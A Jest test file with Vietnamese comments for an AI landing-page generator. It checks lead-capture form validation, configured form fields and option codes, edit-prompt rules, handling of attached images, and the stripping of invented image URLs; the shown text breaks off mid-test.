import { afterEach, beforeEach, describe, expect, it, jest } from '@jest/globals';
import { OCCUPATION_VALUES, INTEREST_AREA_VALUES } from '../../../utils/landingLeadFormConfig.util.js';

const getContextForLandingAi = jest.fn(async () => '');
const generateWithBudget = jest.fn();

jest.unstable_mockModule('../businessProfile.service.js', () => ({
  default: { getContextForLandingAi },
}));

jest.unstable_mockModule('../aiUsageMeter.service.js', () => ({
  default: { generateWithBudget },
}));

const {
  default: aiLandingPageService,
  buildModelParts,
  buildAttachmentPromptBlock,
  validateLandingImageUrls,
  stripDisallowedImages,
  EDIT_TIME_BUDGET_MS,
  EDIT_FULL_REWRITE_MS_PER_CHAR,
} = await import('../aiLandingPage.service.js');
const { MAX_EDIT_HTML_INPUT_CHARS, MAX_FULL_REWRITE_HTML_CHARS } = await import('../../../utils/landingEditGuard.util.js');

/**
 * Chạy `fn` với AI_LANDING_EDIT_MODE = mode (undefined = xoá biến → chế độ vá mặc định), trả lại giá
 * trị cũ ở finally. Prompt viết-lại-cả-trang chỉ còn đi qua đường này (công tắc `full`) hoặc dự phòng.
 */
const withEditMode = async (mode, fn) => {
  const prev = process.env.AI_LANDING_EDIT_MODE;
  if (mode === undefined) delete process.env.AI_LANDING_EDIT_MODE;
  else process.env.AI_LANDING_EDIT_MODE = mode;
  try {
    return await fn();
  } finally {
    if (prev === undefined) delete process.env.AI_LANDING_EDIT_MODE;
    else process.env.AI_LANDING_EDIT_MODE = prev;
  }
};

/**
 * Chốt kiểm sau sinh (aiLandingPage.service.js): trang phải có ĐÚNG MỘT
 * <form data-founderai-capture> với name="email" — nếu không, founderai-capture.js
 * không bắt được submit và lead rơi mất lặng lẽ. Trước đây (LANDING_FORM_PLACEHOLDER)
 * server tự chèn placeholder khi AI quên — giờ fail cứng 422 để không phát hành trang
 * có form không hoạt động.
 */
const validFormHtml =
  '<!DOCTYPE html><html lang="vi"><head><meta name="viewport" content="width=device-width, initial-scale=1"/><script src="https://cdn.tailwindcss.com"></script></head><body>' +
  '<form data-founderai-capture>' +
  '<input type="text" name="name" /><input type="email" name="email" /><input type="tel" name="phone" />' +
  '<label><input type="checkbox" name="marketingConsent" /> Đồng ý nhận thông tin</label>' +
  '<button type="submit">Đăng ký</button>' +
  '</form>' +
  '<div class="founderai-capture-success" style="display:none"></div>' +
  '<div class="founderai-capture-error" style="display:none"></div>' +
  '</body></html>';

const mockGenerateReturns = (html, usage = undefined) => {
  generateWithBudget.mockResolvedValue({
    text: JSON.stringify({ title: 'T', html }),
    blockReason: null,
    finishReason: 'STOP',
    ...(usage ? { usage } : {}),
  });
};

describe('aiLandingPageService.generate — chốt form data-founderai-capture', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    getContextForLandingAi.mockResolvedValue('');
  });

  it('form đúng hợp đồng (data-founderai-capture + name=email) → pass, không đổi html', async () => {
    const logSpy = jest.spyOn(console, 'log').mockImplementation(() => {});
    try {
      mockGenerateReturns(validFormHtml, { outputTokens: 321 });
      const result = await aiLandingPageService.generate({ userId: 1, prompt: 'landing khoá học' });
      expect(result.html).toBe(validFormHtml);

      const lifecycleLogs = logSpy.mock.calls.map(([line]) => line);
      expect(lifecycleLogs).toHaveLength(2);
      expect(lifecycleLogs[0]).toMatch(/^\[LandingAI\] start mode=generate ms=\d+ finishReason=unknown promptChars=\d+ htmlChars=0$/);
      expect(lifecycleLogs[1]).toMatch(new RegExp(
        `^\\[LandingAI\\] done mode=generate outcome=success ms=\\d+ finishReason=STOP promptChars=\\d+ htmlChars=${validFormHtml.length} outputTokens=321$`
      ));
    } finally {
      logSpy.mockRestore();
    }
  });

  it('model trả JSON hỏng nhưng còn nguyên html thoát → giải mã ra HTML thật, không phát hành \\n/\\" chữ (09/09)', async () => {
    const docWithNewlines = validFormHtml.replace(/></g, '>\n<');
    const escaped = JSON.stringify(docWithNewlines).slice(1, -1);
    generateWithBudget.mockResolvedValue({
      text: `{"title": "T", "html": "${escaped}"`, // thiếu } đóng → JSON.parse fail → fallback
      finishReason: 'STOP',
    });
    const result = await aiLandingPageService.generate({ userId: 1, prompt: 'landing khoá học' });
    expect(result.html).toBe(docWithNewlines);
    expect(result.html).not.toMatch(/\\n|\\"/);
  });

  it('thiếu data-founderai-capture → 422', async () => {
    const html = validFormHtml.replace('data-founderai-capture', '');
    mockGenerateReturns(html);
    await expect(
      aiLandingPageService.generate({ userId: 1, prompt: 'landing khoá học' })
    ).rejects.toMatchObject({ status: 422, message: expect.stringMatching(/data-founderai-capture/) });
  });

  it('có data-founderai-capture nhưng thiếu name="email" → 422', async () => {
    const logSpy = jest.spyOn(console, 'log').mockImplementation(() => {});
    try {
      const html = validFormHtml.replace('<input type="email" name="email" />', '<input type="email" />');
      mockGenerateReturns(html);
      await expect(
        aiLandingPageService.generate({ userId: 1, prompt: 'landing khoá học' })
      ).rejects.toMatchObject({ status: 422, message: expect.stringMatching(/email/) });

      expect(logSpy.mock.calls.map(([line]) => line)).toEqual([
        expect.stringMatching(/^\[LandingAI\] start mode=generate ms=\d+ finishReason=unknown promptChars=\d+ htmlChars=0$/),
        expect.stringMatching(new RegExp(
          // B-15: dòng lỗi có thêm errorCode ở cuối (lỗi 422 không mã riêng → HTTP_422).
          `^\\[LandingAI\\] done mode=generate outcome=error ms=\\d+ finishReason=STOP promptChars=\\d+ htmlChars=${html.length} errorCode=HTTP_422$`
        )),
      ]);
    } finally {
      logSpy.mockRestore();
    }
  });
});

/**
 * PLAN_FORM_LANDING_AI_GIU_FORM_2026-09-06.md PR-2b (bản sửa Review 08/09 tối) +
 * PLAN_LEAD_FORM_TRUONG_THEM_2026-09-08.md PR-2d-3 việc 1: leadFormConfig (đã áp dụng qua
 * applyLeadFormDraftToConfig, KHÔNG còn là leadFormDraft thô — đổi tên tham số cho đúng, xem
 * ai.controller.js) điều khiển occupation/interestArea VÀ customFields[]. cf_sugg_NN_text
 * không còn là hàng chết từ khi PR-2d-1/2d-2 nối lại đường lưu thật (nghiệm thu SQL production
 * 09/09) — bỏ đoạn "không nhúng cf_sugg" của PR-2b vì lý do của nó đã hết.
 */
describe('aiLandingPageService.generate — leadFormConfig điều khiển occupation/interestArea/customFields', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    getContextForLandingAi.mockResolvedValue('');
  });

  // values: mã <option value> kèm theo — ô select/radio (kể cả occupation/interestArea) phải
  // có ĐỦ mã đã cấu hình, không thì chốt 422 "không đúng mã" (09/09, xem service).
  const withField = (html, name, values = []) =>
    html.replace(
      '<label><input type="checkbox" name="marketingConsent" />',
      `<select name="${name}"><option value="">x</option>` +
        values.map((v) => `<option value="${v}">${v}</option>`).join('') +
        '</select>' +
        '<label><input type="checkbox" name="marketingConsent" />'
    );

  it('leadFormConfig.fixedFields.occupation.visible=true → prompt chứa đúng khoá OCCUPATION_VALUES', async () => {
    mockGenerateReturns(withField(validFormHtml, 'occupation', OCCUPATION_VALUES));
    await aiLandingPageService.generate({
      userId: 1,
      prompt: 'landing khoá học',
      leadFormConfig: { fixedFields: { occupation: { visible: true }, interestArea: { visible: false } } },
    });
    const sentPrompt = generateWithBudget.mock.calls[0][1].parts[0].text;
    expect(sentPrompt).toContain('name="occupation"');
    for (const value of OCCUPATION_VALUES) {
      expect(sentPrompt).toContain(`<option value="${value}">${value}</option>`);
    }
    // interestArea không yêu cầu → không nhúng option interestArea vào prompt
    expect(sentPrompt).not.toContain('name="interestArea"');
  });

  it('leadFormConfig.fixedFields.interestArea.visible=true → prompt chứa đúng khoá INTEREST_AREA_VALUES', async () => {
    mockGenerateReturns(withField(validFormHtml, 'interestArea', INTEREST_AREA_VALUES));
    await aiLandingPageService.generate({
      userId: 1,
      prompt: 'landing khoá học',
      leadFormConfig: { fixedFields: { occupation: { visible: false }, interestArea: { visible: true } } },
    });
    const sentPrompt = generateWithBudget.mock.calls[0][1].parts[0].text;
    expect(sentPrompt).toContain('name="interestArea"');
    for (const value of INTEREST_AREA_VALUES) {
      expect(sentPrompt).toContain(`<option value="${value}">${value}</option>`);
    }
  });

  it('leadFormConfig không có (hoặc cả hai visible=false, customFields rỗng) → prompt KHÔNG thêm rule 9, hành vi như cũ', async () => {
    mockGenerateReturns(validFormHtml);
    await aiLandingPageService.generate({ userId: 1, prompt: 'landing khoá học' });
    const sentPrompt = generateWithBudget.mock.calls[0][1].parts[0].text;
    expect(sentPrompt).not.toContain('name="occupation"');
    expect(sentPrompt).not.toContain('name="interestArea"');
  });

  it('occupation.visible=true nhưng HTML thiếu name="occupation" → 422', async () => {
    mockGenerateReturns(validFormHtml); // không có field occupation
    await expect(
      aiLandingPageService.generate({
        userId: 1,
        prompt: 'landing khoá học',
        leadFormConfig: { fixedFields: { occupation: { visible: true } } },
      })
    ).rejects.toMatchObject({ status: 422, message: expect.stringMatching(/occupation/) });
  });

  it('interestArea.visible=true nhưng HTML thiếu name="interestArea" → 422', async () => {
    mockGenerateReturns(validFormHtml); // không có field interestArea
    await expect(
      aiLandingPageService.generate({
        userId: 1,
        prompt: 'landing khoá học',
        leadFormConfig: { fixedFields: { interestArea: { visible: true } } },
      })
    ).rejects.toMatchObject({ status: 422, message: expect.stringMatching(/interestArea/) });
  });

  it('occupation.visible=true và HTML CÓ name="occupation" đủ OCCUPATION_VALUES → pass, không 422', async () => {
    mockGenerateReturns(withField(validFormHtml, 'occupation', OCCUPATION_VALUES));
    const result = await aiLandingPageService.generate({
      userId: 1,
      prompt: 'landing khoá học',
      leadFormConfig: { fixedFields: { occupation: { visible: true } } },
    });
    expect(result.html).toContain('name="occupation"');
  });

  it('occupation có name nhưng option value là nhãn tự chế (không đúng OCCUPATION_VALUES) → 422', async () => {
    mockGenerateReturns(withField(validFormHtml, 'occupation', ['Sinh viên', 'Đi làm']));
    await expect(
      aiLandingPageService.generate({
        userId: 1,
        prompt: 'landing khoá học',
        leadFormConfig: { fixedFields: { occupation: { visible: true } } },
      })
    ).rejects.toMatchObject({ status: 422, message: expect.stringMatching(/occupation.*không đúng danh sách/) });
  });

  it('interestArea có mã chứa & thoát thành &amp; → vẫn pass (trình duyệt giải mã lại khi gửi)', async () => {
    const escaped = INTEREST_AREA_VALUES.map((v) => v.replace(/&/g, '&amp;'));
    mockGenerateReturns(withField(validFormHtml, 'interestArea', escaped));
    const result = await aiLandingPageService.generate({
      userId: 1,
      prompt: 'landing khoá học',
      leadFormConfig: { fixedFields: { interestArea: { visible: true } } },
    });
    expect(result.html).toContain('name="interestArea"');
  });

  it('customFields text → prompt chứa name="<khoá>" đúng khoá tất định cf_sugg_01_text', async () => {
    mockGenerateReturns(withField(validFormHtml, 'cf_sugg_01_text'));
    await aiLandingPageService.generate({
      userId: 1,
      prompt: 'landing khoá học',
      leadFormConfig: {
        customFields: [
          { key: 'cf_sugg_01_text', type: 'text', labelVi: 'Tên công ty', required: true, options: [] },
        ],
      },
    });
    const sentPrompt = generateWithBudget.mock.calls[0][1].parts[0].text;
    expect(sentPrompt).toContain('name="cf_sugg_01_text"');
    expect(sentPrompt).toContain('required');
  });

  it('customFields select → prompt copy NGUYÊN mã option, không đổi/dịch', async () => {
    mockGenerateReturns(withField(validFormHtml, 'cf_sugg_02_text', ['small', 'large']));
    await aiLandingPageService.generate({
      userId: 1,
      prompt: 'landing khoá học',
      leadFormConfig: {
        customFields: [
          {
            key: 'cf_sugg_02_text',
            type: 'select',
            labelVi: 'Quy mô',
            required: false,
            options: [
              { value: 'small', labelVi: '1-10 người' },
              { value: 'large', labelVi: '50+ người' },
            ],
          },
        ],
      },
    });
    const sentPrompt = generateWithBudget.mock.calls[0][1].parts[0].text;
    expect(sentPrompt).toContain('name="cf_sugg_02_text"');
    expect(sentPrompt).toContain('<option value="small">1-10 người</option>');
    expect(sentPrompt).toContain('<option value="large">50+ người</option>');
  });

  it('customFields yêu cầu nhưng HTML thiếu name="<khoá>" → 422 kèm nhãn field', async () => {
    mockGenerateReturns(validFormHtml); // không có field cf_sugg_01_text
    await expect(
      aiLandingPageService.generate({
        userId: 1,
        prompt: 'landing khoá học',
        leadFormConfig: {
          customFields: [{ key: 'cf_sugg_01_text', type: 'text', labelVi: 'Tên công ty', required: true, options: [] }],
        },
      })
    ).rejects.toMatchObject({
      status: 422,
      message: expect.stringMatching(/Tên công ty.*cf_sugg_01_text|cf_sugg_01_text.*Tên công ty/),
    });
  });

  it('customFields select có name nhưng option value là NHÃN thay vì mã (ca slug-test 09/09) → 422 kèm nhãn field', async () => {
    mockGenerateReturns(withField(validFormHtml, 'cf_field_g2e9', ['Lựa chọn 1']));
    await expect(
      aiLandingPageService.generate({
        userId: 1,
        prompt: 'landing khoá học',
        leadFormConfig: {
          customFields: [
            {
              key: 'cf_field_g2e9',
              type: 'select',
              labelVi: 'lươngthưởng',
              required: true,
              options: [
                { value: 'opt_a', labelVi: 'Lựa chọn 1' },
                { value: 'opt_1', labelVi: 'Lựa chọn 2' },
              ],
            },
          ],
        },
      })
    ).rejects.toMatchObject({
      status: 422,
      message: expect.stringMatching(/lươngthưởng.*không đúng mã/),
    });
  });

  it('customFields text (không có option) → không bị chốt mã option, pass như cũ', async () => {
    mockGenerateReturns(withField(validFormHtml, 'cf_sugg_01_text'));
    const result = await aiLandingPageService.generate({
      userId: 1,
      prompt: 'landing khoá học',
      leadFormConfig: {
        customFields: [{ key: 'cf_sugg_01_text', type: 'text', labelVi: 'Tên công ty', required: true, options: [] }],
      },
    });
    expect(result.html).toContain('name="cf_sugg_01_text"');
  });

  it('customFields có mặt trong HTML → pass, không 422', async () => {
    mockGenerateReturns(withField(validFormHtml, 'cf_sugg_01_text'));
    const result = await aiLandingPageService.generate({
      userId: 1,
      prompt: 'landing khoá học',
      leadFormConfig: {
        customFields: [{ key: 'cf_sugg_01_text', type: 'text', labelVi: 'Tên công ty', required: true, options: [] }],
      },
    });
    expect(result.html).toContain('name="cf_sugg_01_text"');
  });
});

/**
 * PLAN_LEAD_FORM_TRUONG_THEM_2026-09-08.md PR-2d-3 việc 2 — "đường sửa bằng AI" (editHtml)
 * chưa có test nào trước đây (grep xác nhận trước khi viết). Rule 2 cũ ("Giữ NGUYÊN VĂN...
 * không xóa trường nào") không phân biệt "AI tự ý xoá field" (cấm) với "người dùng CHỦ ĐỘNG
 * yêu cầu thêm field" (hợp lệ) — thêm rule 2b làm rõ ngoại lệ, giữ nguyên guard
 * data-founderai-capture (landingEditGuard.util.js:104, PR-2a) không đổi.
 */
describe('aiLandingPageService.editHtml — rule 2b: thêm trường vào form hiện có', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  it('prompt chứa rule 2b hướng dẫn thêm trường vào ĐÚNG form data-founderai-capture, không tạo form thứ 2, không xoá trường khác', async () => {
    generateWithBudget.mockResolvedValue({
      text: JSON.stringify({ title: 'T', html: validFormHtml }),
      blockReason: null,
      finishReason: 'STOP',
    });
    await aiLandingPageService.editHtml({
      userId: 1,
      currentHtml: validFormHtml,
      instruction: 'Thêm ô Tên công ty vào form',
    });
    const sentPrompt = generateWithBudget.mock.calls[0][1].parts[0].text;
    expect(sentPrompt).toContain('data-founderai-capture');
    expect(sentPrompt).toMatch(/KHÔNG tạo form thứ 2/i);
    expect(sentPrompt).toMatch(/GIỮ NGUYÊN mọi trường đang có/i);
    // Yêu cầu người dùng vẫn phải xuất hiện nguyên văn trong prompt gửi Gemini.
    expect(sentPrompt).toContain('Thêm ô Tên công ty vào form');
  });

  it('kết quả hợp lệ (giữ nguyên form + đủ 3 trường gốc) → pass, trả đúng html', async () => {
    const logSpy = jest.spyOn(console, 'log').mockImplementation(() => {});
    try {
      generateWithBudget.mockResolvedValue({
        text: JSON.stringify({ title: 'T', html: validFormHtml }),
        blockReason: null,
        finishReason: 'STOP',
      });
      const result = await aiLandingPageService.editHtml({
        userId: 1,
        currentHtml: validFormHtml,
        instruction: 'Thêm ô Tên công ty vào form',
      });
      expect(result.html).toBe(validFormHtml);

      const doneLog = logSpy.mock.calls.map(([line]) => line)[1];
      expect(doneLog).toMatch(new RegExp(
        `^\\[LandingAI\\] done mode=edit outcome=success ms=\\d+ finishReason=STOP promptChars=\\d+ htmlChars=${validFormHtml.length} strategy=patch_full_html$`
      ));
      expect(doneLog).not.toContain('outputTokens=');
    } finally {
      logSpy.mockRestore();
    }
  });

  it('thiếu currentHtml → 400, không gọi Gemini', async () => {
    await expect(
      aiLandingPageService.editHtml({ userId: 1, currentHtml: '', instruction: 'Thêm ô Tên công ty' })
    ).rejects.toMatchObject({ status: 400 });
    expect(generateWithBudget).not.toHaveBeenCalled();
  });
});

/**
 * PLAN_FORM_DAT_LICH_THANH_TOAN_2026-09-13.md, PR-5b-1.
 *
 * Prompt editHtml (quy tắc 2 :520, quy tắc 4 :528) phải dặn AI giữ nguyên văn khối nhúng
 * Biểu mẫu `<section data-founderai-form-section>` và không xoá thẻ <script src=".../form-embed.js">
 * dù quy tắc 4 cấm JS logic ngoài Tailwind CDN — trước bản vá này không có câu ngoại lệ nào,
 * AI có thể coi form-embed.js là "JavaScript logic" cần xoá.
 */
describe('aiLandingPageService.editHtml — prompt giữ nguyên khối nhúng Biểu mẫu (PR-5b-1)', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  it('prompt chứa data-founderai-form-section và ngoại lệ cho thẻ script form-embed.js', async () => {
    generateWithBudget.mockResolvedValue({
      text: JSON.stringify({ title: 'T', html: validFormHtml }),
      blockReason: null,
      finishReason: 'STOP',
    });
    await aiLandingPageService.editHtml({
      userId: 1,
      currentHtml: validFormHtml,
      instruction: 'Đổi màu nút thành xanh',
    });
    const sentPrompt = generateWithBudget.mock.calls[0][1].parts[0].text;
    expect(sentPrompt).toContain('data-founderai-form-section');
    expect(sentPrompt).toContain('data-founderai-form');
    expect(sentPrompt).toMatch(/GIỮ NGUYÊN VĂN toàn bộ khối đó/i);
    expect(sentPrompt).toMatch(/DI CHUYỂN cả khối nguyên vẹn/i);
    // Quy tắc 4 (cấm JS ngoài Tailwind CDN) phải có câu ngoại lệ tường minh cho form-embed.js.
    expect(sentPrompt).toMatch(/form-embed\.js/);
    expect(sentPrompt).toMatch(/trừ thẻ.*form-embed\.js/i);
  });
});

describe('aiLandingPageService — đính kèm ảnh và tài liệu (Việc 1.6)', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    getContextForLandingAi.mockResolvedValue('');
  });

  it('(i) có 2 asset → prompt chứa cả 2 URL và parts có đúng số inlineData bằng số inlineForModel', async () => {
    const asset1 = {
      url: 'https://example.com/lp-assets/uploads/1/landing/logo.png',
      originalName: 'logo.png',
      contentType: 'image/png',
      inlineForModel: true,
      base64: 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
    };
    const asset2 = {
      url: 'https://example.com/lp-assets/uploads/1/landing/banner.jpg',
      originalName: 'banner.jpg',
      contentType: 'image/jpeg',
      inlineForModel: false,
      base64: null,
    };
    const doc = {
      originalName: 'brochure.pdf',
      text: 'Nội dung khoá học lập trình 2026',
    };

    const generatedHtml = validFormHtml.replace(
      '</body>',
      `<img src="${asset1.url}" alt="Logo"><img src="${asset2.url}" alt="Banner"></body>`
    );
    mockGenerateReturns(generatedHtml);

    const res = await aiLandingPageService.generate({
      userId: 1,
      prompt: 'Tạo landing khoá học',
      assets: [asset1, asset2],
      documents: [doc],
    });

    expect(res.html).toContain(asset1.url);
    expect(res.html).toContain(asset2.url);

    const callArgs = generateWithBudget.mock.calls[0][1];
    const fullPromptText = callArgs.parts[0].text;
    expect(fullPromptText).toContain(asset1.url);
    expect(fullPromptText).toContain(asset2.url);
    expect(fullPromptText).toContain('brochure.pdf');
    expect(fullPromptText).toContain('Nội dung khoá học lập trình 2026');
    // B-1 (3): tài liệu là DỮ LIỆU, không phải lệnh — không còn "BẮT BUỘC tuân thủ" yêu cầu trong tài liệu.
    expect(fullPromptText).toContain('đọc hiểu và bám sát dàn ý/cấu trúc/nội dung đó');
    expect(fullPromptText).not.toContain('BẮT BUỘC đọc hiểu và tuân thủ');
    expect(fullPromptText).not.toContain('dữ kiện, không phải chỉ dẫn');
    expect(fullPromptText).toContain('THỨ TỰ DỮ KIỆN VÀ YÊU CẦU: (1) TÀI LIỆU ĐÍNH KÈM (ưu tiên hàng đầu');

    // Số inlineData phải bằng 1 (vì chỉ asset1 có inlineForModel = true)
    const inlineDataParts = callArgs.parts.filter((p) => p.inlineData);
    expect(inlineDataParts).toHaveLength(1);
    expect(inlineDataParts[0].inlineData.mimeType).toBe('image/png');
    expect(inlineDataParts[0].inlineData.data).toBe(asset1.base64);
  });

  it('(ii) HTML thiếu 1 URL → 422 đúng message "AI không dùng ảnh..."', async () => {
    const asset1 = {
      url: 'https://example.com/lp-assets/uploads/1/landing/logo.png',
      originalName: 'logo.png',
      contentType: 'image/png',
      inlineForModel: false,
    };
    const asset2 = {
      url: 'https://example.com/lp-assets/uploads/1/landing/banner.jpg',
      originalName: 'banner.jpg',
      contentType: 'image/jpeg',
      inlineForModel: false,
    };

    // Model chỉ dùng asset1, quên asset2
    const generatedHtml = validFormHtml.replace(
      '</body>',
      `<img src="${asset1.url}" alt="Logo"></body>`
    );
    mockGenerateReturns(generatedHtml);

    await expect(
      aiLandingPageService.generate({
        userId: 1,
        prompt: 'Tạo landing',
        assets: [asset1, asset2],
      })
    ).rejects.toMatchObject({
      status: 422,
      message: 'AI không dùng ảnh "banner.jpg" đã đính kèm. Vui lòng thử lại.',
    });
  });

  it('(iii) HTML có https://images.unsplash.com/x.jpg → 422 "AI bịa URL ảnh ngoài hệ thống"', async () => {
    const asset1 = {
      url: 'https://example.com/lp-assets/uploads/1/landing/logo.png',
      originalName: 'logo.png',
      contentType: 'image/png',
      inlineForModel: false,
    };

    const generatedHtml = validFormHtml.replace(
      '</body>',
      `<img src="${asset1.url}"><img src="https://images.unsplash.com/photo-123.jpg"></body>`
    );
    expect(() => validateLandingImageUrls({ html: generatedHtml, assets: [asset1] })).toThrow(
      expect.objectContaining({
        code: 'LANDING_FAKE_IMAGE_URL',
        status: 422,
      })
    );

    mockGenerateReturns(generatedHtml);

    const result = await aiLandingPageService.generate({
      userId: 1,
      prompt: 'Tạo landing',
      assets: [asset1],
    });
    expect(result.html).not.toContain('https://images.unsplash.com/photo-123.jpg');
    expect(result.strippedImageUrls).toEqual(['https://images.unsplash.com/photo-123.jpg']);
  });

  it('(iv) đường sửa: URL ảnh đã có trong currentHtml được giữ, không 422', async () => {
    const existingImgUrl = 'https://example.com/existing-image.png';
    const currentHtmlWithImg = validFormHtml.replace(
      '</body>',
      `<img src="${existingImgUrl}" alt="Old Image"></body>`
    );

    const assetNew = {
      url: 'https://example.com/lp-assets/uploads/1/landing/new-logo.png',
      originalName: 'new-logo.png',
      contentType: 'image/png',
      inlineForModel: false,
    };

    const newHtml = validFormHtml.replace(
      '</body>',
      `<img src="${existingImgUrl}" alt="Old Image"><img src="${assetNew.url}" alt="New Logo"></body>`
    );

    generateWithBudget.mockResolvedValue({
      text: JSON.stringify({ title: 'T', html: newHtml }),
      blockReason: null,
      finishReason: 'STOP',
    });

    const result = await aiLandingPageService.editHtml({
      userId: 1,
      currentHtml: currentHtmlWithImg,
      instruction: 'Thêm new logo',
      assets: [assetNew],
    });

    expect(result.html).toContain(existingImgUrl);
    expect(result.html).toContain(assetNew.url);
  });

  it('(v) không asset → prompt không có khối ẢNH, <img> lạ được gỡ bỏ sau retry', async () => {
    const htmlWithFakeImg = validFormHtml.replace(
      '</body>',
      `<img src="https://fake.cdn.com/test.webp" alt="Fake"></body>`
    );
    expect(() => validateLandingImageUrls({ html: htmlWithFakeImg, assets: [] })).toThrow(
      expect.objectContaining({
        code: 'LANDING_FAKE_IMAGE_URL',
        status: 422,
      })
    );

    mockGenerateReturns(htmlWithFakeImg);

    const result = await aiLandingPageService.generate({
      userId: 1,
      prompt: 'Tạo landing không ảnh',
      assets: [],
      documents: [],
    });
    expect(result.html).not.toContain('https://fake.cdn.com/test.webp');
    expect(result.strippedImageUrls).toEqual(['https://fake.cdn.com/test.webp']);

    // Kiểm tra prompt không có khối ẢNH ĐÃ TẢI LÊN
    const callArgs = generateWithBudget.mock.calls[0][1];
    expect(callArgs.parts[0].text).not.toContain('=== ẢNH ĐÃ TẢI LÊN');
  });

  it('(vi) hồ sơ doanh nghiệp có Logo URL .png, HTML dùng nó, không asset → không 422', async () => {
    const companyLogoUrl = 'https://example.com/company-logo.png';
    getContextForLandingAi.mockResolvedValue(`HỒ SƠ DOANH NGHIỆP: Logo URL: ${companyLogoUrl}`);

    const htmlWithLogo = validFormHtml.replace(
      '</body>',
      `<img src="${companyLogoUrl}" alt="Company Logo"></body>`
    );
    mockGenerateReturns(htmlWithLogo);

    const result = await aiLandingPageService.generate({
      userId: 1,
      prompt: 'Tạo landing dùng logo công ty',
      assets: [],
      documents: [],
    });

    expect(result.html).toContain(companyLogoUrl);
    const callArgs = generateWithBudget.mock.calls[0][1];
    expect(callArgs.parts[0].text).toContain('chỉ được dùng Logo URL của hồ sơ doanh nghiệp nếu có, không dùng ảnh nào khác');
  });
});

/**
 * PR-5b-2a (`PLAN_FORM_DAT_LICH_THANH_TOAN_2026-09-13.md`, "Bổ sung 15/09 khi soạn lệnh
 * PR-5b-2") — AI_LANDING_FORM_MODE=form: AI chỉ đặt chỗ trống, không còn tự viết
 * <form data-founderai-capture>. Đọc process.env LÚC GỌI generate(), không lúc nạp module — mọi
 * test trong file này TRƯỚC đoạn này chạy với biến chưa set (mode 'lead', 28 ca đã xanh ở trên,
 * không sửa assertion nào) để chứng minh mặc định KHÔNG đổi hành vi.
 */
describe('aiLandingPageService.generate — AI_LANDING_FORM_MODE=form (PR-5b-2a)', () => {
  const validSlotHtml =
    '<!DOCTYPE html><html lang="vi"><head><meta name="viewport" content="width=device-width, initial-scale=1"/><script src="https://cdn.tailwindcss.com"></script></head><body>' +
    '<section><div data-founderai-form-slot></div></section>' +
    '</body></html>';

  beforeEach(() => {
    jest.clearAllMocks();
    getContextForLandingAi.mockResolvedValue('');
  });

  afterEach(() => {
    delete process.env.AI_LANDING_FORM_MODE;
  });

  it('công tắc TẮT (mặc định/không set) → prompt vẫn đòi <form data-founderai-capture> như cũ, chỗ trống bị coi là thiếu form → 422', async () => {
    delete process.env.AI_LANDING_FORM_MODE;
    mockGenerateReturns(validSlotHtml);
    await expect(
      aiLandingPageService.generate({ userId: 1, prompt: 'landing khoá học' })
    ).rejects.toMatchObject({ status: 422, message: expect.stringMatching(/data-founderai-capture/) });
  });

  it('công tắc BẬT: HTML có đúng 1 chỗ trống, không <form> → qua chốt chặn, không đổi html', async () => {
    process.env.AI_LANDING_FORM_MODE = 'form';
    mockGenerateReturns(validSlotHtml);
    const result = await aiLandingPageService.generate({ userId: 1, prompt: 'landing khoá học' });
    expect(result.html).toBe(validSlotHtml);
  });

  it('công tắc BẬT: prompt không còn cấu trúc <form data-founderai-capture>, có nhắc data-founderai-form-slot, KHÔNG kèm buildLeadFormExtraFieldsPromptBlock', async () => {
    process.env.AI_LANDING_FORM_MODE = 'form';
    mockGenerateReturns(validSlotHtml);
    await aiLandingPageService.generate({
      userId: 1,
      prompt: 'landing khoá học',
      leadFormConfig: { fixedFields: { occupation: { visible: true }, interestArea: { visible: true } } },
    });
    const promptText = generateWithBudget.mock.calls[0][1].parts[0].text;
    expect(promptText).toContain('data-founderai-form-slot');
    expect(promptText).not.toContain('data-founderai-capture');
    // OCCUPATION_VALUES[0] — rule 9 (buildLeadFormExtraFieldsPromptBlock) không còn chèn vào prompt ở mode form dù leadFormConfig yêu cầu occupation.
    expect(promptText).not.toMatch(/Sinh viên \/ Học sinh/);
  });

  it('công tắc BẬT: HTML vẫn còn <form data-founderai-capture> (model "quen tay") → 422', async () => {
    process.env.AI_LANDING_FORM_MODE = 'form';
    mockGenerateReturns(validFormHtml);
    await expect(
      aiLandingPageService.generate({ userId: 1, prompt: 'landing khoá học' })
    ).rejects.toMatchObject({ status: 422, message: expect.stringMatching(/vẫn tự viết <form>/) });
  });

  it('công tắc BẬT: HTML có 0 chỗ trống → 422', async () => {
    process.env.AI_LANDING_FORM_MODE = 'form';
    const htmlNoSlot = '<!DOCTYPE html><html lang="vi"><head><script src="https://cdn.tailwindcss.com"></script></head><body><section>x</section></body></html>';
    mockGenerateReturns(htmlNoSlot);
    await expect(
      aiLandingPageService.generate({ userId: 1, prompt: 'landing khoá học' })
    ).rejects.toMatchObject({ status: 422, message: expect.stringMatching(/không tạo chỗ trống/) });
  });

  // Review PR-5b-2a nợ 1 (15/09) — chỗ trống có nội dung con (dạng hỏng) trước đây bị đếm là 0
  // rồi báo nhầm "AI không tạo chỗ trống" — giờ phải báo đúng nguyên nhân.
  it('công tắc BẬT: HTML có chỗ trống sai dạng (có nội dung con) → 422 báo đúng nguyên nhân, không nhầm "thiếu chỗ trống"', async () => {
    process.env.AI_LANDING_FORM_MODE = 'form';
    const htmlMalformed =
      '<!DOCTYPE html><html lang="vi"><head><meta name="viewport" content="width=device-width, initial-scale=1"/><script src="https://cdn.tailwindcss.com"></script></head><body>' +
      '<section><div data-founderai-form-slot><p>x</p></div></section></body></html>';
    mockGenerateReturns(htmlMalformed);
    await expect(
      aiLandingPageService.generate({ userId: 1, prompt: 'landing khoá học' })
    ).rejects.toMatchObject({ status: 422, message: expect.stringMatching(/sai dạng/) });
  });

  it('công tắc BẬT: HTML có 2 chỗ trống → 422', async () => {
    process.env.AI_LANDING_FORM_MODE = 'form';
    const htmlTwoSlots = validSlotHtml.replace(
      '</section>',
      '</section><section><div data-founderai-form-slot></div></section>'
    );
    mockGenerateReturns(htmlTwoSlots);
    await expect(
      aiLandingPageService.generate({ userId: 1, prompt: 'landing khoá học' })
